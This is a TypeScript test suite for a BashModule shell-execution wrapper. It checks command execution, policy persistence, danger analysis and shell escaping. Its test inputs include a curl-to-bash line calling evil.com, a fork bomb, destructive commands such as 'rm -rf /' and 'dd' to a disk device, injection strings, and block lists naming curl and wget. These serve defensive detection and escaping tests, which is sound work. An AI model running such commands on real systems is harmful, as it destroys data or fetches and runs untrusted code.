/**
 * @fileoverview Tests for BashModule - DO Integration Module
 *
 * These tests verify the BashModule class that integrates with dotdo's
 * WorkflowContext, providing $.bash.exec(), $.bash.run(), and safety
 * analysis functionality.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest'
import {
  BashModule,
  createBashModule,
  isBashModule,
  type BashModuleOptions,
  type BashResult,
  type BashExecutor,
  type FsCapability,
  type ExecOptions,
  type SpawnHandle,
  type SpawnOptions,
} from '../../src/do/BashModule'

// ============================================================================
// Mock Implementations
// ============================================================================

/**
 * Mock FsCapability for testing filesystem operations
 */
class MockFsCapability implements FsCapability {
  private files: Map<string, string | Buffer> = new Map()
  private dirs: Set<string> = new Set()

  async readFile(path: string): Promise<string | Buffer> {
    const content = this.files.get(path)
    if (content === undefined) {
      throw new Error(`File not found: ${path}`)
    }
    return content
  }

  async writeFile(path: string, content: string | Buffer): Promise<void> {
    this.files.set(path, content)
  }

  async readDir(path: string): Promise<string[]> {
    const entries: string[] = []
    const prefix = path.endsWith('/') ? path : path + '/'

    for (const key of this.files.keys()) {
      if (key.startsWith(prefix)) {
        const rest = key.slice(prefix.length)
        const firstSegment = rest.split('/')[0]
        if (firstSegment && !entries.includes(firstSegment)) {
          entries.push(firstSegment)
        }
      }
    }

    return entries
  }

  async exists(path: string): Promise<boolean> {
    return this.files.has(path) || this.dirs.has(path)
  }

  async mkdir(path: string, options?: { recursive?: boolean }): Promise<void> {
    if (options?.recursive) {
      const parts = path.split('/').filter(Boolean)
      let current = ''
      for (const part of parts) {
        current += '/' + part
        this.dirs.add(current)
      }
    } else {
      this.dirs.add(path)
    }
  }

  async rm(path: string, options?: { recursive?: boolean; force?: boolean }): Promise<void> {
    if (options?.recursive) {
      const prefix = path.endsWith('/') ? path : path + '/'
      for (const key of this.files.keys()) {
        if (key === path || key.startsWith(prefix)) {
          this.files.delete(key)
        }
      }
    } else {
      this.files.delete(path)
    }
    this.dirs.delete(path)
  }

  // Test helpers
  _setFile(path: string, content: string | Buffer): void {
    this.files.set(path, content)
  }

  _clear(): void {
    this.files.clear()
    this.dirs.clear()
  }
}

/**
 * Mock BashExecutor for testing command execution
 */
class MockBashExecutor implements BashExecutor {
  public lastCommand: string | null = null
  public lastOptions: ExecOptions | undefined = undefined
  public mockResult: BashResult = {
    command: '',
    stdout: 'mock output',
    stderr: '',
    exitCode: 0,
  }
  public shouldThrow = false
  public throwError: Error | null = null

  async execute(command: string, options?: ExecOptions): Promise<BashResult> {
    this.lastCommand = command
    this.lastOptions = options

    if (this.shouldThrow) {
      throw this.throwError ?? new Error('Mock execution error')
    }

    return {
      ...this.mockResult,
      command,
    }
  }

  spawn?(command: string, args?: string[], options?: SpawnOptions): Promise<SpawnHandle> {
    const handle: SpawnHandle = {
      pid: 12345,
      done: Promise.resolve({
        command: `${command} ${args?.join(' ') ?? ''}`,
        stdout: 'spawn output',
        stderr: '',
        exitCode: 0,
      }),
      kill: vi.fn(),
      write: vi.fn(),
      closeStdin: vi.fn(),
    }
    return Promise.resolve(handle)
  }

  // Test helpers
  _reset(): void {
    this.lastCommand = null
    this.lastOptions = undefined
    this.shouldThrow = false
    this.throwError = null
    this.mockResult = {
      command: '',
      stdout: 'mock output',
      stderr: '',
      exitCode: 0,
    }
  }
}

// ============================================================================
// Test Suites
// ============================================================================

describe('BashModule', () => {
  let mockFs: MockFsCapability
  let mockExecutor: MockBashExecutor
  let bashModule: BashModule

  beforeEach(() => {
    mockFs = new MockFsCapability()
    mockExecutor = new MockBashExecutor()
    bashModule = new BashModule({
      executor: mockExecutor,
      fs: mockFs,
      cwd: '/app',
    })
  })

  describe('constructor', () => {
    it('should create instance with default options', () => {
      const module = new BashModule()
      expect(module).toBeInstanceOf(BashModule)
      expect(module.name).toBe('bash')
    })

    it('should create instance with custom options', () => {
      const module = new BashModule({
        executor: mockExecutor,
        fs: mockFs,
        cwd: '/custom',
        defaultTimeout: 60000,
        blockedCommands: ['rm'],
        requireConfirmation: false,
      })
      expect(module).toBeInstanceOf(BashModule)
    })

    it('should set module name to "bash"', () => {
      expect(bashModule.name).toBe('bash')
    })
  })

  describe('hasFsCapability', () => {
    it('should return true when FsCapability is configured', () => {
      expect(bashModule.hasFsCapability).toBe(true)
    })

    it('should return false when FsCapability is not configured', () => {
      const moduleNoFs = new BashModule({ executor: mockExecutor })
      expect(moduleNoFs.hasFsCapability).toBe(false)
    })
  })

  describe('hasExecutor', () => {
    it('should return true when executor is configured', () => {
      expect(bashModule.hasExecutor).toBe(true)
    })

    it('should return false when executor is not configured', () => {
      const moduleNoExecutor = new BashModule({ fs: mockFs })
      expect(moduleNoExecutor.hasExecutor).toBe(false)
    })
  })

  describe('exec()', () => {
    it('should execute a simple command', async () => {
      const result = await bashModule.exec('ls')
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('ls')
    })

    it('should execute a command with arguments', async () => {
      const result = await bashModule.exec('ls', ['-la', '/tmp'])
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('ls -la /tmp')
    })

    it('should escape arguments with special characters', async () => {
      const result = await bashModule.exec('echo', ['hello world'])
      expect(mockExecutor.lastCommand).toBe("echo 'hello world'")
    })

    it('should not escape safe arguments', async () => {
      const result = await bashModule.exec('git', ['status', '--short'])
      expect(mockExecutor.lastCommand).toBe('git status --short')
    })

    it('should pass options to executor', async () => {
      await bashModule.exec('ls', [], { timeout: 5000, cwd: '/home' })
      expect(mockExecutor.lastOptions?.timeout).toBe(5000)
      expect(mockExecutor.lastOptions?.cwd).toBe('/home')
    })

    it('should use default cwd if not specified', async () => {
      await bashModule.exec('pwd')
      expect(mockExecutor.lastOptions?.cwd).toBe('/app')
    })

    it('should fail without executor', async () => {
      const moduleNoExecutor = new BashModule({ fs: mockFs })
      const result = await moduleNoExecutor.exec('ls')
      expect(result.exitCode).toBe(1)
      expect(result.stderr).toContain('No executor configured')
    })

    it('should handle executor errors', async () => {
      mockExecutor.shouldThrow = true
      mockExecutor.throwError = new Error('Connection failed')
      const result = await bashModule.exec('ls')
      expect(result.exitCode).toBe(1)
      expect(result.stderr).toContain('Connection failed')
    })

    it('should block dangerous commands without confirmation', async () => {
      const result = await bashModule.exec('rm', ['-rf', '/'])
      expect(result.blocked).toBe(true)
      expect(result.exitCode).toBe(1)
    })

    it('should allow dangerous commands with confirmation', async () => {
      const result = await bashModule.exec('rm', ['-rf', '/tmp/test'], { confirm: true })
      expect(result.blocked).toBeUndefined()
      expect(result.exitCode).toBe(0)
    })

    it('should block commands in blocked list', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        blockedCommands: ['wget'],
      })
      const result = await module.exec('wget', ['http://example.com'])
      expect(result.blocked).toBe(true)
      expect(result.blockReason).toContain('wget')
    })

    it('should support dry-run mode', async () => {
      const result = await bashModule.exec('ls', ['-la'], { dryRun: true })
      expect(result.exitCode).toBe(0)
      expect(result.stdout).toContain('[dry-run]')
      expect(mockExecutor.lastCommand).toBeNull() // Not executed
    })
  })

  describe('spawn()', () => {
    it('should spawn a command', async () => {
      const handle = await bashModule.spawn('tail', ['-f', '/var/log/app.log'])
      expect(handle.pid).toBe(12345)
    })

    it('should return a spawn handle with done promise', async () => {
      const handle = await bashModule.spawn('ls')
      const result = await handle.done
      expect(result.exitCode).toBe(0)
    })

    it('should throw without spawn support in executor', async () => {
      const executorNoSpawn: BashExecutor = {
        execute: async () => ({
          command: '',
          stdout: '',
          stderr: '',
          exitCode: 0,
        }),
      }
      const module = new BashModule({ executor: executorNoSpawn })
      await expect(module.spawn('ls')).rejects.toThrow('Spawn not supported')
    })

    it('should block dangerous commands in spawn', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        blockedCommands: ['rm'],
      })
      await expect(module.spawn('rm', ['-rf', '/'])).rejects.toThrow('blocked')
    })
  })

  describe('run()', () => {
    it('should execute a script', async () => {
      const script = `
        set -e
        echo "hello"
        pwd
      `
      const result = await bashModule.run(script)
      expect(result.exitCode).toBe(0)
    })

    it('should pass options to executor', async () => {
      await bashModule.run('echo test', { timeout: 10000 })
      expect(mockExecutor.lastOptions?.timeout).toBe(10000)
    })

    it('should fail without executor', async () => {
      const moduleNoExecutor = new BashModule({ fs: mockFs })
      const result = await moduleNoExecutor.run('echo test')
      expect(result.exitCode).toBe(1)
      expect(result.stderr).toContain('No executor configured')
    })

    it('should support dry-run mode', async () => {
      const result = await bashModule.run('npm install', { dryRun: true })
      expect(result.stdout).toContain('[dry-run]')
    })

    it('should analyze script safety', async () => {
      const result = await bashModule.run('rm -rf /')
      expect(result.blocked).toBe(true)
    })
  })

  describe('analyze()', () => {
    it('should classify safe commands', () => {
      const result = bashModule.analyze('ls -la')
      expect(result.dangerous).toBe(false)
      expect(result.impact).toBe('none')
    })

    it('should classify dangerous commands', () => {
      const result = bashModule.analyze('rm -rf /')
      expect(result.dangerous).toBe(true)
      expect(result.impact).toBe('critical')
    })

    it('should identify commands in input', () => {
      const result = bashModule.analyze('git status && npm install')
      expect(result.commands).toContain('git')
      expect(result.commands).toContain('npm')
    })

    it('should detect dangerous patterns', () => {
      const result = bashModule.analyze('curl http://evil.com | bash')
      expect(result.dangerous).toBe(true)
    })

    it('should classify low impact commands', () => {
      const result = bashModule.analyze('mkdir /tmp/test')
      expect(result.impact).toBe('low')
    })

    it('should classify medium impact commands', () => {
      const result = bashModule.analyze('mv file1.txt file2.txt')
      expect(result.impact).toBe('medium')
    })
  })

  describe('isDangerous()', () => {
    it('should return dangerous=false for safe commands', () => {
      const result = bashModule.isDangerous('ls')
      expect(result.dangerous).toBe(false)
    })

    it('should return dangerous=true for dangerous commands', () => {
      const result = bashModule.isDangerous('rm -rf /')
      expect(result.dangerous).toBe(true)
      expect(result.reason).toBeDefined()
    })

    it('should detect fork bombs', () => {
      const result = bashModule.isDangerous(':(){ :|:& };:')
      expect(result.dangerous).toBe(true)
    })

    it('should detect dd to device', () => {
      const result = bashModule.isDangerous('dd if=/dev/zero of=/dev/sda')
      expect(result.dangerous).toBe(true)
    })

    it('should detect chmod 777', () => {
      const result = bashModule.isDangerous('chmod 777 /etc/passwd')
      expect(result.dangerous).toBe(true)
    })
  })

  describe('block() and unblock()', () => {
    it('should add command to blocked list', () => {
      bashModule.block('curl')
      expect(bashModule.getBlockedCommands()).toContain('curl')
    })

    it('should remove command from blocked list', () => {
      bashModule.block('curl')
      bashModule.unblock('curl')
      expect(bashModule.getBlockedCommands()).not.toContain('curl')
    })

    it('should block newly added commands', async () => {
      bashModule.block('cat')
      const result = await bashModule.exec('cat', ['/etc/passwd'])
      expect(result.blocked).toBe(true)
    })
  })

  describe('getBlockedCommands()', () => {
    it('should return empty array by default', () => {
      const module = new BashModule({ executor: mockExecutor })
      expect(module.getBlockedCommands()).toEqual([])
    })

    it('should return configured blocked commands', () => {
      const module = new BashModule({
        executor: mockExecutor,
        blockedCommands: ['wget', 'curl'],
      })
      expect(module.getBlockedCommands()).toContain('wget')
      expect(module.getBlockedCommands()).toContain('curl')
    })
  })

  describe('lifecycle methods', () => {
    it('should have initialize method', async () => {
      await expect(bashModule.initialize()).resolves.toBeUndefined()
    })

    it('should have dispose method', async () => {
      await expect(bashModule.dispose()).resolves.toBeUndefined()
    })
  })
})

describe('createBashModule factory', () => {
  it('should create BashModule instance', () => {
    const module = createBashModule()
    expect(module).toBeInstanceOf(BashModule)
  })

  it('should pass options correctly', () => {
    const mockExecutor = new MockBashExecutor()
    const module = createBashModule({
      executor: mockExecutor,
      cwd: '/home',
      defaultTimeout: 60000,
    })
    expect(module).toBeInstanceOf(BashModule)
    expect(module.hasExecutor).toBe(true)
  })
})

describe('isBashModule type guard', () => {
  it('should return true for BashModule instance', () => {
    const module = new BashModule()
    expect(isBashModule(module)).toBe(true)
  })

  it('should return false for plain object', () => {
    const obj = { name: 'bash' }
    expect(isBashModule(obj)).toBe(false)
  })

  it('should return false for null', () => {
    expect(isBashModule(null)).toBe(false)
  })

  it('should return false for undefined', () => {
    expect(isBashModule(undefined)).toBe(false)
  })
})

describe('BashModule with FsCapability dependency', () => {
  let mockFs: MockFsCapability
  let mockExecutor: MockBashExecutor
  let bashModule: BashModule

  beforeEach(() => {
    mockFs = new MockFsCapability()
    mockExecutor = new MockBashExecutor()
    bashModule = new BashModule({
      executor: mockExecutor,
      fs: mockFs,
    })
  })

  it('should have FsCapability dependency', () => {
    expect(bashModule.hasFsCapability).toBe(true)
  })

  it('should work without FsCapability', () => {
    const moduleNoFs = new BashModule({ executor: mockExecutor })
    expect(moduleNoFs.hasFsCapability).toBe(false)
  })

  it('should use FsCapability for cwd context', async () => {
    // FsCapability provides the virtual filesystem context
    // Commands can read/write files through it
    mockFs._setFile('/app/test.txt', 'content')
    const exists = await mockFs.exists('/app/test.txt')
    expect(exists).toBe(true)
  })
})

describe('BashModule requireConfirmation option', () => {
  let mockExecutor: MockBashExecutor

  beforeEach(() => {
    mockExecutor = new MockBashExecutor()
  })

  it('should require confirmation by default', async () => {
    const module = new BashModule({ executor: mockExecutor })
    const result = await module.exec('rm', ['-rf', '/tmp'])
    expect(result.blocked).toBe(true)
  })

  it('should not require confirmation when disabled', async () => {
    const module = new BashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    const result = await module.exec('rm', ['-rf', '/tmp'])
    expect(result.blocked).toBeUndefined()
  })
})

// ============================================================================
// Mock Storage Implementation
// ============================================================================

/**
 * Mock BashStorage for testing database integration
 */
class MockBashStorage {
  private tables: Map<string, unknown[]> = new Map()
  private autoIncrementId = 1

  constructor() {
    this.tables.set('exec', [])
  }

  sql = {
    exec: (query: string, ...params: unknown[]) => {
      const rows = this.executeQuery(query, params)
      return {
        toArray: () => rows
      }
    }
  }

  private executeQuery(query: string, params: unknown[]): unknown[] {
    const execTable = this.tables.get('exec') as Record<string, unknown>[]

    // Handle SELECT queries
    if (query.toUpperCase().startsWith('SELECT')) {
      if (query.includes('WHERE name = ?')) {
        const name = params[0] as string
        return execTable.filter(row => row.name === name)
      }
      if (query.includes('WHERE id = ?')) {
        const id = params[0] as number
        return execTable.filter(row => row.id === id)
      }
      return execTable
    }

    // Handle INSERT queries
    if (query.toUpperCase().startsWith('INSERT')) {
      const newRow: Record<string, unknown> = {
        id: this.autoIncrementId++,
        name: params[0] as string,
        blocked_commands: params[1],
        require_confirmation: params[2],
        default_timeout: params[3],
        default_cwd: params[4],
        allowed_patterns: params[5],
        denied_patterns: params[6],
        max_concurrent: params[7],
        enabled: params[8],
        created_at: params[9],
        updated_at: params[10],
      }
      execTable.push(newRow)
      return []
    }

    // Handle UPDATE queries
    if (query.toUpperCase().startsWith('UPDATE')) {
      const id = params[params.length - 1] as number
      const rowIndex = execTable.findIndex(row => row.id === id)
      if (rowIndex >= 0) {
        execTable[rowIndex] = {
          ...execTable[rowIndex],
          blocked_commands: params[0],
          require_confirmation: params[1],
          default_timeout: params[2],
          default_cwd: params[3],
          allowed_patterns: params[4],
          denied_patterns: params[5],
          max_concurrent: params[6],
          enabled: params[7],
          updated_at: params[8],
        }
      }
      return []
    }

    return []
  }

  // Test helper to inspect stored data
  _getExecTable(): unknown[] {
    return this.tables.get('exec') || []
  }

  _reset(): void {
    this.tables.set('exec', [])
    this.autoIncrementId = 1
  }
}

// ============================================================================
// Database Integration Tests
// ============================================================================

describe('BashModule with storage integration', () => {
  let mockStorage: MockBashStorage
  let mockExecutor: MockBashExecutor

  beforeEach(() => {
    mockStorage = new MockBashStorage()
    mockExecutor = new MockBashExecutor()
  })

  describe('initialize()', () => {
    it('should create a new policy in the database when none exists', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'test-policy',
        blockedCommands: ['rm', 'wget'],
      })

      await module.initialize()

      const execTable = mockStorage._getExecTable() as Record<string, unknown>[]
      expect(execTable.length).toBe(1)
      expect(execTable[0].name).toBe('test-policy')
      expect(JSON.parse(execTable[0].blocked_commands as string)).toEqual(['rm', 'wget'])
    })

    it('should load existing policy from database', async () => {
      // Create a policy directly in storage
      mockStorage.sql.exec(
        `INSERT INTO exec (name, blocked_commands, require_confirmation, default_timeout, default_cwd, allowed_patterns, denied_patterns, max_concurrent, enabled, created_at, updated_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        'existing-policy',
        JSON.stringify(['curl', 'scp']),
        0,
        60000,
        '/home',
        null,
        null,
        10,
        1,
        Date.now(),
        Date.now()
      )

      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'existing-policy',
      })

      await module.initialize()

      const policy = module.getPolicy()
      expect(policy.blockedCommands).toEqual(['curl', 'scp'])
      expect(policy.requireConfirmation).toBe(false)
      expect(policy.defaultTimeout).toBe(60000)
      expect(policy.defaultCwd).toBe('/home')
      expect(policy.maxConcurrent).toBe(10)
    })

    it('should use default policy name when not specified', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
      })

      await module.initialize()

      const policy = module.getPolicy()
      expect(policy.name).toBe('default')
    })
  })

  describe('getPolicy()', () => {
    it('should return current policy configuration', () => {
      const module = new BashModule({
        executor: mockExecutor,
        blockedCommands: ['rm'],
        requireConfirmation: true,
        defaultTimeout: 45000,
        cwd: '/app',
        policyName: 'my-policy',
      })

      const policy = module.getPolicy()

      expect(policy.name).toBe('my-policy')
      expect(policy.blockedCommands).toEqual(['rm'])
      expect(policy.requireConfirmation).toBe(true)
      expect(policy.defaultTimeout).toBe(45000)
      expect(policy.defaultCwd).toBe('/app')
    })
  })

  describe('updatePolicy()', () => {
    it('should update policy and persist to database', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'update-test',
      })

      await module.initialize()

      await module.updatePolicy({
        blockedCommands: ['rm', 'dd', 'mkfs'],
        requireConfirmation: false,
        defaultTimeout: 60000,
        maxConcurrent: 3,
      })

      const policy = module.getPolicy()
      expect(policy.blockedCommands).toEqual(['rm', 'dd', 'mkfs'])
      expect(policy.requireConfirmation).toBe(false)
      expect(policy.defaultTimeout).toBe(60000)
      expect(policy.maxConcurrent).toBe(3)

      // Verify persistence
      const execTable = mockStorage._getExecTable() as Record<string, unknown>[]
      expect(execTable.length).toBe(1)
      expect(JSON.parse(execTable[0].blocked_commands as string)).toEqual(['rm', 'dd', 'mkfs'])
    })

    it('should update individual policy fields', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'partial-update',
        blockedCommands: ['rm'],
        defaultTimeout: 30000,
      })

      await module.initialize()

      // Only update timeout
      await module.updatePolicy({
        defaultTimeout: 90000,
      })

      const policy = module.getPolicy()
      expect(policy.blockedCommands).toEqual(['rm']) // Unchanged
      expect(policy.defaultTimeout).toBe(90000) // Updated
    })
  })

  describe('block() with storage', () => {
    it('should persist blocked command to database', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'block-test',
      })

      await module.initialize()

      module.block('dangerous-cmd')

      // Allow async persistence to complete
      await new Promise(resolve => setTimeout(resolve, 10))

      const execTable = mockStorage._getExecTable() as Record<string, unknown>[]
      const blockedCommands = JSON.parse(execTable[0].blocked_commands as string)
      expect(blockedCommands).toContain('dangerous-cmd')
    })
  })

  describe('unblock() with storage', () => {
    it('should persist unblocked command to database', async () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'unblock-test',
        blockedCommands: ['cmd1', 'cmd2', 'cmd3'],
      })

      await module.initialize()

      module.unblock('cmd2')

      // Allow async persistence to complete
      await new Promise(resolve => setTimeout(resolve, 10))

      const execTable = mockStorage._getExecTable() as Record<string, unknown>[]
      const blockedCommands = JSON.parse(execTable[0].blocked_commands as string)
      expect(blockedCommands).toEqual(['cmd1', 'cmd3'])
      expect(blockedCommands).not.toContain('cmd2')
    })
  })

  describe('isEnabled()', () => {
    it('should return true by default', () => {
      const module = new BashModule({ executor: mockExecutor })
      expect(module.isEnabled()).toBe(true)
    })

    it('should reflect enabled state from loaded policy', async () => {
      // Create a disabled policy
      mockStorage.sql.exec(
        `INSERT INTO exec (name, blocked_commands, require_confirmation, default_timeout, default_cwd, allowed_patterns, denied_patterns, max_concurrent, enabled, created_at, updated_at)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        'disabled-policy',
        '[]',
        1,
        30000,
        '/',
        null,
        null,
        5,
        0,  // disabled
        Date.now(),
        Date.now()
      )

      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
        policyName: 'disabled-policy',
      })

      await module.initialize()

      expect(module.isEnabled()).toBe(false)
    })
  })

  describe('hasStorage()', () => {
    it('should return true when storage is configured', () => {
      const module = new BashModule({
        executor: mockExecutor,
        storage: mockStorage,
      })
      expect(module.hasStorage()).toBe(true)
    })

    it('should return false when storage is not configured', () => {
      const module = new BashModule({
        executor: mockExecutor,
      })
      expect(module.hasStorage()).toBe(false)
    })
  })
})

// ============================================================================
// Tagged Template Literal Tests
// ============================================================================

describe('BashModule tagged template literals', () => {
  let mockExecutor: MockBashExecutor
  let bashModule: BashModule

  beforeEach(() => {
    mockExecutor = new MockBashExecutor()
    bashModule = new BashModule({
      executor: mockExecutor,
      cwd: '/app',
      requireConfirmation: false,
    })
  })

  describe('tag() method', () => {
    it('should execute a simple command', async () => {
      const result = await bashModule.tag`ls -la`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('ls -la')
    })

    it('should interpolate string values', async () => {
      const dir = '/tmp'
      const result = await bashModule.tag`ls -la ${dir}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('ls -la /tmp')
    })

    it('should escape strings with spaces', async () => {
      const dir = '/tmp/my folder'
      const result = await bashModule.tag`ls -la ${dir}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe("ls -la '/tmp/my folder'")
    })

    it('should escape strings with special characters', async () => {
      const filename = 'file; rm -rf /'
      const result = await bashModule.tag`cat ${filename}`
      expect(result.exitCode).toBe(0)
      // Special characters should be quoted to prevent injection
      expect(mockExecutor.lastCommand).toBe("cat 'file; rm -rf /'")
    })

    it('should escape strings with single quotes', async () => {
      const filename = "it's a file"
      const result = await bashModule.tag`cat ${filename}`
      expect(result.exitCode).toBe(0)
      // Single quotes in the value should be properly escaped
      expect(mockExecutor.lastCommand).toBe("cat 'it'\\''s a file'")
    })

    it('should handle multiple interpolations', async () => {
      const src = 'source.txt'
      const dest = 'dest.txt'
      const result = await bashModule.tag`cp ${src} ${dest}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('cp source.txt dest.txt')
    })

    it('should handle number values', async () => {
      const count = 10
      const result = await bashModule.tag`head -n ${count} file.txt`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('head -n 10 file.txt')
    })

    it('should handle boolean values', async () => {
      const verbose = true
      const result = await bashModule.tag`echo ${verbose}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('echo true')
    })

    it('should handle null values as empty strings', async () => {
      const value = null
      const result = await bashModule.tag`echo ${value}end`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('echo end')
    })

    it('should handle undefined values as empty strings', async () => {
      const value = undefined
      const result = await bashModule.tag`echo ${value}end`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('echo end')
    })

    it('should handle empty strings', async () => {
      const value = ''
      const result = await bashModule.tag`echo ${value}end`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe("echo ''end")
    })

    it('should handle array values', async () => {
      const files = ['file1.txt', 'file2.txt', 'file3.txt']
      const result = await bashModule.tag`cat ${files}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('cat file1.txt file2.txt file3.txt')
    })

    it('should escape array elements with spaces', async () => {
      const files = ['file 1.txt', 'file 2.txt']
      const result = await bashModule.tag`cat ${files}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe("cat 'file 1.txt' 'file 2.txt'")
    })

    it('should handle object values as JSON', async () => {
      const config = { key: 'value', nested: { a: 1 } }
      const result = await bashModule.tag`echo ${config}`
      expect(result.exitCode).toBe(0)
      // Objects are JSON stringified and quoted
      expect(mockExecutor.lastCommand).toBe('echo \'{"key":"value","nested":{"a":1}}\'')
    })

    it('should handle complex interpolation patterns', async () => {
      const user = 'john'
      const host = 'example.com'
      const port = 22
      const result = await bashModule.tag`ssh -p ${port} ${user}@${host}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe('ssh -p 22 john@example.com')
    })

    it('should prevent shell injection via backticks', async () => {
      const malicious = '$(whoami)'
      const result = await bashModule.tag`echo ${malicious}`
      expect(result.exitCode).toBe(0)
      // The $() should be quoted and not executed
      expect(mockExecutor.lastCommand).toBe("echo '$(whoami)'")
    })

    it('should prevent shell injection via backtick syntax', async () => {
      const malicious = '`whoami`'
      const result = await bashModule.tag`echo ${malicious}`
      expect(result.exitCode).toBe(0)
      // The backticks should be quoted and not executed
      expect(mockExecutor.lastCommand).toBe("echo '`whoami`'")
    })

    it('should prevent shell injection via semicolons', async () => {
      const malicious = 'foo; cat /etc/passwd'
      const result = await bashModule.tag`echo ${malicious}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe("echo 'foo; cat /etc/passwd'")
    })

    it('should prevent shell injection via pipes', async () => {
      const malicious = 'foo | cat /etc/passwd'
      const result = await bashModule.tag`echo ${malicious}`
      expect(result.exitCode).toBe(0)
      expect(mockExecutor.lastCommand).toBe("echo 'foo | cat /etc/passwd'")
    })

    it('should handle paths with @ and : characters unquoted', async () => {
      const path = 'user@host:/path/to/file'
      const result = await bashModule.tag`scp ${path}`
      expect(result.exitCode).toBe(0)
      // @ and : are safe characters, no quoting needed
      expect(mockExecutor.lastCommand).toBe('scp user@host:/path/to/file')
    })

    it('should fail without executor', async () => {
      const moduleNoExecutor = new BashModule({ requireConfirmation: false })
      const result = await moduleNoExecutor.tag`ls`
      expect(result.exitCode).toBe(1)
      expect(result.stderr).toContain('No executor configured')
    })
  })
})

// ============================================================================
// Callable BashModule Tests
// ============================================================================

import {
  createCallableBashModule,
  isCallableBashModule,
  type CallableBashModule,
} from '../../src/do/BashModule'

describe('createCallableBashModule', () => {
  let mockExecutor: MockBashExecutor

  beforeEach(() => {
    mockExecutor = new MockBashExecutor()
  })

  it('should create a callable module', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    expect(typeof bash).toBe('function')
  })

  it('should support tagged template syntax', async () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    const result = await bash`ls -la`
    expect(result.exitCode).toBe(0)
    expect(mockExecutor.lastCommand).toBe('ls -la')
  })

  it('should support tagged template with interpolation', async () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    const dir = '/home/user'
    const result = await bash`ls -la ${dir}`
    expect(result.exitCode).toBe(0)
    expect(mockExecutor.lastCommand).toBe('ls -la /home/user')
  })

  it('should support regular method calls', async () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    const result = await bash.exec('git', ['status'])
    expect(result.exitCode).toBe(0)
    expect(mockExecutor.lastCommand).toBe('git status')
  })

  it('should preserve module name property', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
    })
    expect(bash.name).toBe('bash')
  })

  it('should support hasExecutor check', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
    })
    expect(bash.hasExecutor).toBe(true)
  })

  it('should support analyze method', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
    })
    const analysis = bash.analyze('rm -rf /')
    expect(analysis.dangerous).toBe(true)
  })

  it('should support block and unblock methods', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
    })
    bash.block('curl')
    expect(bash.getBlockedCommands()).toContain('curl')
    bash.unblock('curl')
    expect(bash.getBlockedCommands()).not.toContain('curl')
  })

  it('should support run method', async () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    const result = await bash.run('echo hello')
    expect(result.exitCode).toBe(0)
  })

  it('should support getPolicy method', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      cwd: '/workspace',
      defaultTimeout: 60000,
    })
    const policy = bash.getPolicy()
    expect(policy.defaultCwd).toBe('/workspace')
    expect(policy.defaultTimeout).toBe(60000)
  })

  it('should escape special characters in template values', async () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })
    const malicious = '$(rm -rf /)'
    const result = await bash`echo ${malicious}`
    expect(result.exitCode).toBe(0)
    expect(mockExecutor.lastCommand).toBe("echo '$(rm -rf /)'")
  })

  it('should work with mixed method and template usage', async () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
      requireConfirmation: false,
    })

    // Use as template
    const result1 = await bash`echo hello`
    expect(result1.exitCode).toBe(0)

    // Use as method
    const result2 = await bash.exec('echo', ['world'])
    expect(result2.exitCode).toBe(0)

    // Use as template again
    const result3 = await bash`echo goodbye`
    expect(result3.exitCode).toBe(0)
  })
})

describe('isCallableBashModule', () => {
  let mockExecutor: MockBashExecutor

  beforeEach(() => {
    mockExecutor = new MockBashExecutor()
  })

  it('should return true for CallableBashModule', () => {
    const bash = createCallableBashModule({
      executor: mockExecutor,
    })
    expect(isCallableBashModule(bash)).toBe(true)
  })

  it('should return false for regular BashModule', () => {
    const bash = new BashModule({
      executor: mockExecutor,
    })
    expect(isCallableBashModule(bash)).toBe(false)
  })

  it('should return false for plain objects', () => {
    expect(isCallableBashModule({})).toBe(false)
  })

